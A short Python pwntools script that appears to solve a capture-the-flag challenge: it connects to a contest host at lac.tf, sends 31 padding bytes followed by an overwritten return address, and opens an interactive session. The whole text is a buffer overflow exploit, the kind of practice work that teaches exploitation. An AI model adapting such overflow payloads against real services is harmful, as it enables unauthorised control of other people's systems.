from pwn import *

r = remote("lac.tf", 31121)
payload = b'a'*31 + p64(0x80011d5)
r.sendline(payload)
r.interactive()